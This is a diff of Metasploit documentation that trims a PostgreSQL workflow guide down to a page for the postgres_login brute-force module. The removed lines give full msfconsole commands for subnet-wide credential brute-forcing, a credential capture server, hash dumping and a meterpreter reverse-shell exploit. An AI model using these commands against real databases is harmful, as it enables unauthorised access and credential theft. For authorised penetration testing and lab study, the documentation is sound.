@@ -1,95 +1,23 @@
-## PostgreSQL Workflows
+## Description
 
-PostgreSQL, sometimes aliased as Postgres, is frequently found on port 5432/TCP. It is an open-source relational database management system.
+This auxiliary module is a brute-force login tool for Postgres servers.
 
-Metasploit has support for multiple PostgreSQL modules, including:
+## Verification Steps
 
-- Version enumeration
-- Verifying/bruteforcing credentials
-- Dumping database information
-- Capture server
-- Executing arbitrary SQL queries against the database
-- Gaining reverse shells
+1. Do: `use auxiliary/scanner/postgres/postgres_login`
+2. Do: `set PASS_FILE [file containing passwords]`
+3. Do: `set RHOSTS [IP]`
+4. Do: `set USER_FILE [file containing usernames]`
+5. Do: `set DATABASE [template name]`
+6. Do: `run`
 
-There are more modules than listed here, for the full list of modules run the `search` command within msfconsole:
+The above USER_FILE and PASS_FILE options can be replaced with USERNAME
+and PASSWORD if you know the credentials.
 
-```msf
-msf6 > search postgres
-```
+## Getting an Interactive Session
 
-Or to search for modules that work with a specific session type:
-
-```msf
-msf6 > search session_type:postgres
-```
-
-
-### Lab Environment
-
-When testing in a lab environment PostgreSQL can either be installed on the host machine or within Docker:
-
-```
-docker run -it --rm --publish 127.0.0.1:5432:5432 -e POSTGRES_PASSWORD=password postgres:13.1-alpine
-```
-
-### PostgreSQL Enumeration
-
-Enumerate version:
-
-```
-use auxiliary/scanner/postgres/postgres_version
-run postgres://192.168.123.13
-run postgres://postgres:password@192.168.123.13
-```
-
-### PostgreSQL Login / Bruteforce
-
-If you have PostgreSQL credentials to validate:
-
-```
-use auxiliary/scanner/postgres/postgres_login
-run 'postgres://root: a b c p4$$w0rd@127.0.0.1'
-```
-
-Re-using PostgreSQL credentials in a subnet:
-
-```
-use auxiliary/scanner/postgres/postgres_login
-run cidr:/24:myspostgresl://user:pass@192.168.222.0 threads=50
-```
-
-Using an alternative port:
-
-```
-use auxiliary/scanner/postgres/postgres_login
-run postgres://user:pass@192.168.123.6:2222
-```
-
-Brute-force host with known user and password list:
-
-```
-use auxiliary/scanner/postgres/postgres_login
-run postgres://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
-```
-
-Brute-force credentials:
-
-```
-use auxiliary/scanner/postgres/postgres_login
-run postgres://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
-```
-
-Brute-force credentials in a subnet:
-
-```
-use auxiliary/scanner/postgres/postgres_login
-run cidr:/24:postgres://user:pass@192.168.222.0 threads=50
-run cidr:/24:postgres://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
-```
-
-### Obtaining an Interactive Session
-The CreateSession option for `auxiliary/scanner/postgres/postgres_login` allows you to obtain an
-interactive session for the Postgres client you're connecting to. The run command with CreateSession
+The CreateSession option allows you to obtain an interactive session
+for the Postgres client you're connecting to. The run command with CreateSession
 set to true should give you an interactive session.
 
 For example:
@@ -237,60 +165,4 @@ Response
     1  pg_type
 
 SQL >>
-```
-
-### PostgreSQL Capture Server
-
-Captures and log PostgreSQL credentials:
-
-```
-use auxiliary/server/capture/postgresql
-run
-```
-
-For example, if a client connects with:
-
-```
-psql postgres://postgres:mysecretpassword@localhost:5432
-```
-
-Metasploit's output will be:
-
-```msf
-msf6 auxiliary(server/capture/postgresql) >
-[*] Started service listener on 0.0.0.0:5432
-[*] Server started.
-[+] PostgreSQL LOGIN 127.0.0.1:60406 postgres / mysecretpassword / postgres
-```
-
-### PostgreSQL Dumping
-
-User and hash dump:
-
-```
-use auxiliary/scanner/postgres/postgres_hashdump
-run postgres://postgres:password@192.168.123.13
-run postgres://postgres:password@192.168.123.13/database_name
-```
-
-Schema dump:
-
-```
-use auxiliary/scanner/postgres/postgres_schemadump
-run postgres://postgres:password@192.168.123.13
-run postgres://postgres:password@192.168.123.13 ignored_databases=template1,template0,postgres
-```
-
-### PostgreSQL Querying
-
-```
-use auxiliary/admin/postgres/postgres_sql
-run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()'
-```
-
-### PostgreSQL Reverse Shell
-
-```
-use exploit/linux/postgres/postgres_payload
-run postgres://postgres:password@192.168.123.6 lhost=192.168.123.1 lport=5000 payload=linux/x64/meterpreter/reverse_tcp target='Linux\ x86_64'
 ```
